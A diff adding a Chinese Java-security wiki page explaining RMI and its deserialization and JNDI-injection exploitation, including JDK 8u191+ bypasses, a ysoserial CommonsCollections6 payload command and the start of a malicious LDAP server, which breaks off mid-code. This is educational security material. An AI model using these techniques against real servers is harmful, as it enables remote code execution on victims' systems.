@@ -1,0 +1,931 @@
+
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="mkdocs搭建，使用material主题，并包含官方支持的markdown语法，包括传统语法和扩展语法">
+      
+      
+        <link rel="canonical" href="https://Qclover.github.io/Wiki.JavaSec/java/java反序列化中-rmi的调用/">
+      
+      
+        <meta name="author" content="Qclover">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+    
+      
+        <title>java反序列化中-rmi的调用 - My Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#546e7a">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="blue-grey" data-md-color-accent="pink">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#java-rmi" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://Qclover.github.io/Wiki.JavaSec" title="My Wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              My Wiki
+            </span>
+            <span class="md-header-nav__topic">
+              
+                java反序列化中-rmi的调用
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+<a href="https://github.com/Qclover/markdown-with-mkdocs-material/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    Qclover
+  </div>
+</a>
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://Qclover.github.io/Wiki.JavaSec" title="My Wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    My Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+<a href="https://github.com/Qclover/markdown-with-mkdocs-material/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+  
+    <div class="md-source__icon">
+      <svg viewBox="0 0 24 24" width="24" height="24">
+        <use xlink:href="#__github" width="24" height="24"></use>
+      </svg>
+    </div>
+  
+  <div class="md-source__repository">
+    Qclover
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" checked>
+    
+    <label class="md-nav__link" for="nav-1">
+      一. JavaSec
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        一. JavaSec
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../java基础/" title="Java基础" class="md-nav__link">
+      Java基础
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2" checked>
+    
+    <label class="md-nav__link" for="nav-1-2">
+      Java反序列化
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        Java反序列化
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../1-Java反序列化/" title="Java反序列化介绍" class="md-nav__link">
+      Java反序列化介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        java反序列化中-rmi的调用
+      </label>
+    
+    <a href="./" title="java反序列化中-rmi的调用" class="md-nav__link md-nav__link--active">
+      java反序列化中-rmi的调用
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#java-rmi" class="md-nav__link">
+    java反序列化中-rmi的调用
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1rmi" class="md-nav__link">
+    1.RMI
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11rmi" class="md-nav__link">
+    1.1RMI简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12rmi" class="md-nav__link">
+    1.2RMI原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13java-rmi" class="md-nav__link">
+    1.3JAVA RMI示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2rmi" class="md-nav__link">
+    2.RMI利用调用
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    2.1本地调用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22rmijndi" class="md-nav__link">
+    2.2RMI动态类加载或JNDI注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3jdk-8u191" class="md-nav__link">
+    3.绕过JDK 8u191+等高版本限制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    写在最后
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-3" type="checkbox" id="nav-1-3">
+    
+    <label class="md-nav__link" for="nav-1-3">
+      JavaVul
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-3">
+        JavaVul
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../vul/Java-XXE漏洞/" title="Java-XXE漏洞" class="md-nav__link">
+      Java-XXE漏洞
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../vul/jekins未授权访问漏洞/" title="jekins未授权访问漏洞" class="md-nav__link">
+      jekins未授权访问漏洞
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      二. 杂记
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        二. 杂记
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../" title="时光" class="md-nav__link">
+      时光
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../recommend/" title="三. 使用建议" class="md-nav__link">
+      三. 使用建议
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../contact/" title="四. 联系方式" class="md-nav__link">
+      四. 联系方式
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#java-rmi" class="md-nav__link">
+    java反序列化中-rmi的调用
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1rmi" class="md-nav__link">
+    1.RMI
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#11rmi" class="md-nav__link">
+    1.1RMI简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#12rmi" class="md-nav__link">
+    1.2RMI原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#13java-rmi" class="md-nav__link">
+    1.3JAVA RMI示例
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2rmi" class="md-nav__link">
+    2.RMI利用调用
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    2.1本地调用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22rmijndi" class="md-nav__link">
+    2.2RMI动态类加载或JNDI注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3jdk-8u191" class="md-nav__link">
+    3.绕过JDK 8u191+等高版本限制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    写在最后
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/Qclover/markdown-with-mkdocs-material/edit/master/docs/java/java反序列化中-rmi的调用.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>java反序列化中-rmi的调用</h1>
+                
+                <h2 id="java-rmi">java反序列化中-rmi的调用<a class="headerlink" href="#java-rmi" title="Permanent link">&para;</a></h2>
+<h3 id="1rmi">1.RMI<a class="headerlink" href="#1rmi" title="Permanent link">&para;</a></h3>
+<h4 id="11rmi">1.1RMI简介<a class="headerlink" href="#11rmi" title="Permanent link">&para;</a></h4>
+<p>远程方法调用RMI（Remote Method Invocation），是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
+<p>Java本身对RMI规范的实现默认使用的是JRMP协议</p>
+<p>JRMP：Java Remote Message Protocol ，Java 远程消息交换协议。</p>
+<p>​       Java RMI：Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p>
+<p>​      而RPC是远程过程调用（Remote Procedure Call）可以用于一个进程调用另一个进程（很可能在另一个远程主机上）中的过程，从而提供了**过程的分布能力**。Java 的 RMI 则在 RPC 的基础上向前又迈进了一步，即提供**分布式对象间的通讯**。</p>
+<h4 id="12rmi">1.2RMI原理<a class="headerlink" href="#12rmi" title="Permanent link">&para;</a></h4>
+<p>要了解RMI原理，先了解一下Stub和Skeleton两个概念。</p>
+<p><strong>RMI之Stub和Skeleton</strong></p>
+<p>RMI框架采用代理来负责客户与远程对象之间通过Socket进行通信的细节。RMI框架为远程对象分别生成了客户端代理和服务器端代理。位于客户端的代理类称为存根（Stub），位于服务器端的代理类称为骨架（Skeleton）。</p>
+<p>从网上找来一张图，RMI远程过程调用的实现过程如下图所示：</p>
+<p><img alt="image-20200201174853481" src="C:\Users\clover\Qclover.github.io\assets\images\java-wiki\rmi\1.png" /></p>
+<p>RMI 框架的基本原理大概如下图，应用了代理模式来封装了本地存根与真实的远程对象进行通信的细节</p>
+<p><img alt="image-20200201175324476" src="C:\Users\clover\Qclover.github.io\assets\images\java-wiki\rmi\2.png" /></p>
+<h4 id="13java-rmi">1.3JAVA RMI示例<a class="headerlink" href="#13java-rmi" title="Permanent link">&para;</a></h4>
+<p>创建一个RMI应用包括以下四个步骤：</p>
+<p>1）创建远程接口：继承java.rmi.Remote接口。</p>
+<p>直接或间接继承java.rmi.Remote接口</p>
+<p>接口中的所有方法声明抛出java.rmi.RemoteException。</p>
+<p>2）创建远程类：实现远程接口。</p>
+<p>通过以下两种途径之一把它导出（export）为远程对象：
+       (a)导出为远程对象的第一种方式：使远程类实现远程接口时，同时继承java.rmi.server.UnicastRemoteObject类，并且远程类的构造方法必须声明抛出RemoteException。这是最常用的方式，下面的本例子就采取这种方式。
+public class RemoteImpl extends UnicastRemoteObject implements RemoteInterface
+       (b)导出为远程对象的第二种方式：如果一个远程类已经继承了其他类，无法再继承UnicastRemoteObject类，那么可以在构造方法中调用UnicastRemoteObject类的静态exportObject()方法，同样，远程类的构造方法也必须声明抛出RemoteException。</p>
+<div class="codehilite"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteImpl</span> <span class="kd">extends</span> <span class="n">OtherClass</span> <span class="kd">implements</span> <span class="n">RemoteInterface</span><span class="o">{</span>
+  <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+  <span class="kd">public</span> <span class="nf">RemoteImpl</span> <span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span><span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">{</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">name</span><span class="o">=</span><span class="n">name</span><span class="o">;</span>
+    <span class="n">UnicastRemoteObject</span><span class="o">.</span><span class="na">exportObject</span><span class="o">(</span><span class="k">this</span><span class="o">,</span><span class="mi">0</span><span class="o">);</span>
+  <span class="o">}</span>
+</pre></div>
+
+<p>​        在构造方法RemoteImpl 中调用了UnicastRemoteObject.exportObject(this,0)方法，将自身导出为远程对象。
+​        exportObject()是UnicastRemoteObject的静态方法，源码是：</p>
+<p>​        在构造方法RemoteImpl 中调用了UnicastRemoteObject.exportObject(this,0)方法，将自身导出为远程对象。
+​        exportObject()是UnicastRemoteObject的静态方法，源码是：</p>
+<div class="codehilite"><pre><span></span>    <span class="kd">protected</span> <span class="nf">UnicastRemoteObject</span><span class="o">(</span><span class="kt">int</span> <span class="n">port</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span>
+    <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">=</span> <span class="n">port</span><span class="o">;</span>
+        <span class="n">exportObject</span><span class="o">((</span><span class="n">Remote</span><span class="o">)</span> <span class="k">this</span><span class="o">,</span> <span class="n">port</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Remote</span> <span class="nf">exportObject</span><span class="o">(</span><span class="n">Remote</span> <span class="n">obj</span><span class="o">,</span> <span class="kt">int</span> <span class="n">port</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">RemoteException</span>
+    <span class="o">{</span>
+        <span class="k">return</span> <span class="n">exportObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="k">new</span> <span class="n">UnicastServerRef</span><span class="o">(</span><span class="n">port</span><span class="o">));</span>
+    <span class="o">}</span>
+</pre></div>
+
+<p>​       exportObject(Remote obj, int port)，该方法负责把参数obj指定的对象导出为远程对象，使它具有相应的存根（Stub），并监听远程客户的方法调用请求；参数port指导监听的端口，如果值为0，表示监听任意一个匿名端口。</p>
+<p>​       exportObject(Remote obj, int port)，该方法负责把参数obj指定的对象导出为远程对象，使它具有相应的存根（Stub），并监听远程客户的方法调用请求；参数port指导监听的端口，如果值为0，表示监听任意一个匿名端口。</p>
+<p>3）创建客户程序：通过looup()方法查找远程对象，进行远程方法调用。</p>
+<p>注册一个远程对象remoteObj2 关键代码如下：</p>
+<div class="codehilite"><pre><span></span><span class="n">RemoteInterface</span> <span class="n">remoteObj2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteImpl</span><span class="o">();</span><span class="c1">// 创建远程对象</span>
+<span class="n">Context</span> <span class="n">namingContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span><span class="c1">// 初始化命名内容</span>
+<span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">8892</span><span class="o">);</span><span class="c1">// 在本地主机上创建和导出注册表实例，并在指定的端口上接受请求</span>
+<span class="n">namingContext</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&quot;rmi://localhost:8892/RemoteObj2&quot;</span><span class="o">,</span> <span class="n">remoteObj2</span><span class="o">);</span><span class="c1">// 注册对象，即把对象与一个名字绑定。</span>
+</pre></div>
+
+<p>​     但在JDK1.3版本或更低的版本，需要使用java.rmi.Naming来注册远程对象，注册代码代替如下：</p>
+<div class="codehilite"><pre><span></span><span class="n">RemoteInterface</span> <span class="n">remoteObj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteImpl</span><span class="o">();</span>
+<span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">8891</span><span class="o">);</span>
+<span class="n">Naming</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&quot;rmi://localhost:8891/RemoteObj&quot;</span><span class="o">,</span> <span class="n">remoteObj</span><span class="o">);</span>
+</pre></div>
+
+<p>【1】 bind(String name,Object obj)：注册对象，把对象与一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其它对象绑定，就会抛出NameAlreadyBoundException。
+    【2】rebind(String name,Object obj)：注册对象，把对象与一个名字绑定。如果该名字已经与其它对象绑定，不会抛出NameAlreadyBoundException，而是把当前参数obj指定的对象覆盖原先的对象。
+    【3】 lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象。
+    【4】unbind(String name)：注销对象，取消对象与名字的绑定。</p>
+<h3 id="2rmi">2.RMI利用调用<a class="headerlink" href="#2rmi" title="Permanent link">&para;</a></h3>
+<p>RMI的传输是基于反序列化的。</p>
+<p>对于任何一个对象为参数的RMI接口，都可以发一个自己构建的</p>
+<p>本地调用迫使服务器端将这个对象按任何一个存在于服务端classpath(<strong>编译后的class文件和资源文件都放在了classes目录下</strong>)中的可序列化类来反序列化恢复对象。</p>
+<h4 id="21">2.1本地调用<a class="headerlink" href="#21" title="Permanent link">&para;</a></h4>
+<p>受害者本地存在能被恶意利用的gadget类，如classpath存在含有漏洞版本的CommonsCollections</p>
+<p><strong>Registry端存在恶意利用的gadget类--受害者成为RMI的服务端</strong></p>
+<p>rmi（远程方法调用）客户端和服务端的通信主要通过客户端访问rmi**注册**表拿到存根，stub(存根)用于实现远程对象，相当于是远程对象的引用或者代理（Java RMI使用到了代理模式),存根负责接收本地方法调用,并将它们委派给各自的具体实现对象。通过它调用服务端方法，那么调用方法时要传递参数，参数可以为一般类型，也可以为引用类型，那么如果Registry端也存在CommonsCollections1 payload使用用到的类，就能被恶意利用，利用服务端已经有的gaget chain来打Server。</p>
+<p>ps：Registry对象引用的(一个stub)由java.rmi.registry.LocateRegistry类方法获取</p>
+<p><strong>Server端是作为RMI的服务端而成为受害者</strong></p>
+<p>服务端存在一个公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力。</p>
+<h4 id="22rmijndi">2.2RMI动态类加载或JNDI注入<a class="headerlink" href="#22rmijndi" title="Permanent link">&para;</a></h4>
+<p><strong>此时Server端是作为RMI客户端成为受害者</strong></p>
+<p>在客户端中，正常调用应该是stub.sendMessage(Message)</p>
+<p><strong>前提</strong></p>
+<p>无论是客户端还是服务端都需要去调用**java.rmi.server.codebaseURL**去加载对应的类。另外若要进行远程加载类需要满足：</p>
+<ul>
+<li>1）需要安装RMISecurityManager并且配置java.security.policy</li>
+</ul>
+<p>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy</p>
+<ul>
+<li>2）Java版本低于7u21、6u45或者设置了属性 java.rmi.server.useCodebaseOnly 的值必需为**false**</li>
+</ul>
+<p>即RMI服务端允许远程加载类,还有JDK限制。</p>
+<p>从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
+<p>PS:JNDI注入的利用方法中也借助了这种动态加载类的思路。</p>
+<h3 id="3jdk-8u191">3.绕过JDK 8u191+等高版本限制<a class="headerlink" href="#3jdk-8u191" title="Permanent link">&para;</a></h3>
+<p>对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p>
+<ol>
+<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类（<strong>指定远程恶意类</strong>），并利用这个本地的Factory类执行命令。</li>
+<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
+</ol>
+<p>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。我们先来看一些基本概念，然后再分析这两种绕过方法 。</p>
+<p>1）</p>
+<p>JDK 7u21开始，java.rmi.server.useCodebaseOnly 默认值就为true，防止RMI客户端VM从其他Codebase地址上动态加载类。然而JNDI注入中的Reference Payload并不受useCodebaseOnly影响，因为它没有用到 RMI Class loading，它最终是通过URLClassLoader加载的远程类（Object Factory类的特性）会导致客户端命令执行。。</p>
+<p>2）  </p>
+<p>LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互</p>
+<p>如</p>
+<p>假设目标系统中存在着有漏洞的CommonsCollections库，使用ysoserial生成一个CommonsCollections的利用Payload：</p>
+<div class="codehilite"><pre><span></span><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="mf">0.0.6</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="n">CommonsCollections6</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">Applications</span><span class="o">/</span><span class="n">Calculator</span><span class="o">.</span><span class="na">app</span><span class="o">/</span><span class="n">Contents</span><span class="o">/</span><span class="n">MacOS</span><span class="o">/</span><span class="n">Calculator</span><span class="err">&#39;</span><span class="o">|</span><span class="n">base64</span>
+</pre></div>
+
+<p>LDAP Server关键代码如下，我们在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p>
+<div class="codehilite"><pre><span></span><span class="o">...</span>
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">sendResult</span> <span class="o">(</span> <span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">,</span> <span class="n">String</span> <span class="n">base</span><span class="o">,</span> <span class="n">Entry</span> <span class="n">e</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">LDAPException</span><span class="o">,</span> <span class="n">MalformedURLException</span> <span class="o">{</span>
+    <span class="n">URL</span> <span class="n">turl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">codebase</span><span class="o">.</span><span class="na">getRef</span><span class="o">().</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">).</span><span class="na">concat</span><span class="o">(</span><span class="s">&quot;.class&quot;</span><span class="o">));</span>
